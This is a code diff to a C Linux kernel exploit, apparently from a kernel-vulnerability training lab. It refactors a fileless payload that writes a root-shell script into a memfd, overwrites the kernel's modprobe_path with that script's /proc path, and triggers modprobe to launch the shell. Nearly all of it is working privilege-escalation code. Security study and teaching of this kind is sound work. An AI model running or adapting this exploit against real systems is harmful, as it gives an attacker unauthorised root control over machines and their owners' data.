@@ -275,31 +275,60 @@ void *memmem_modprobe_path(void *memory, size_t memory_size)
 	return modprobe_path_uaddr;
 }
 
-#define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"
-
-/* fileless approach */
-char *prepare_payload(void)
+/* Fileless approach */
+int prepare_privesc_script(char *path, size_t path_size)
 {
-	static char fake_modprobe[40] = { 0 };
 	pid_t pid = getpid();
+	int script_fd = -1;
+	int shell_stdin_fd = -1;
+	int shell_stdout_fd = -1;
+	int ret = EXIT_FAILURE;
 
-	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
-	int shell_stdin_fd = dup(STDIN_FILENO);
-	int shell_stdout_fd = dup(STDOUT_FILENO);
-
-	if (dprintf(modprobe_script_fd, PAYLOAD, pid, shell_stdin_fd, pid, shell_stdout_fd) == 0) {
-		perror("[-] payload fd\n");
-		return NULL;
+	script_fd = memfd_create("", MFD_CLOEXEC);
+	if (script_fd < 0) {
+		perror("[-] memfd_create\n");
+		return EXIT_FAILURE;
 	}
 
-	lseek(modprobe_script_fd, 0, SEEK_SET);
+	shell_stdin_fd = dup(STDIN_FILENO);
+	if (shell_stdin_fd < 0) {
+		perror("[-] dup\n");
+		return EXIT_FAILURE;
+	}
 
-	if (snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid,
-		     modprobe_script_fd) != 0)
+	shell_stdout_fd = dup(STDOUT_FILENO);
+	if (shell_stdout_fd < 0) {
+		perror("[-] dup\n");
+		return EXIT_FAILURE;
+	}
 
-		printf("[+] payload written to: %s\n", fake_modprobe);
+	ret = dprintf(script_fd,
+		      "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
+		      pid, shell_stdin_fd,
+		      pid, shell_stdout_fd);
+	if (ret < 0) {
+		perror("[-] dprintf for privesc_script");
+		return EXIT_FAILURE;
+	}
 
-	return fake_modprobe;
+	ret = lseek(script_fd, 0, SEEK_SET);
+	if (ret < 0) {
+		perror("[-] lseek for privesc_script");
+		return EXIT_FAILURE;
+	}
+
+	ret = snprintf(path, path_size, "/proc/%i/fd/%i", pid, script_fd);
+	if (ret < 0) {
+		perror("[-] snprintf for privesc_script path");
+		return EXIT_FAILURE;
+	}
+	if (ret >= path_size) {
+		printf("[-] snprintf for privesc_script path: truncated\n");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] privesc script is prepared at %s\n", path);
+	return EXIT_SUCCESS;
 }
 
 /* 
@@ -334,10 +363,15 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	char act_args[DRILL_ACT_SIZE] = { 0 };
+	char privesc_script_path[PATH_MAX] = { 0 };
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
 	ret = prepare_page_tables();
+	if (ret == EXIT_FAILURE)
+		goto end;
+
+	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
 	if (ret == EXIT_FAILURE)
 		goto end;
 
@@ -447,6 +481,8 @@ int main(void)
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
 		unsigned long val = *addr;
 		char *modprobe_path_uaddr = NULL;
+		size_t old_len = 0;
+		size_t new_len = 0;
 
 		if (val == MAGIC_VAL)
 			continue;
@@ -456,15 +492,18 @@ int main(void)
 		if (modprobe_path_uaddr == NULL)
 			break;
 
+		old_len = strlen(modprobe_path_uaddr);
+		new_len = strlen(privesc_script_path);
+		printf("[!] modprobe_path len %zu, privesc_script_path len %zu\n", old_len, new_len);
+		if (new_len > old_len) {
+			printf("[-] not enough bytes in modprobe_path\n");
+			break;
+		}
+
+		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
+		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);
+
 		/* TODO: refactoring */
-				printf("[!] dump an exploit fd and write its path as new modprobe path via the overwritten target object\n");
-
-				char *privesc = prepare_payload();
-				if (privesc == NULL)
-					goto end;
-				strcpy(modprobe_path_uaddr, privesc);
-
-				printf("[+] done, triggering a corrupted modprobe to launch a root shell\n");
 				ret = modprobe_trigger_sock();
 				if (ret == EXIT_FAILURE)
 					goto end;
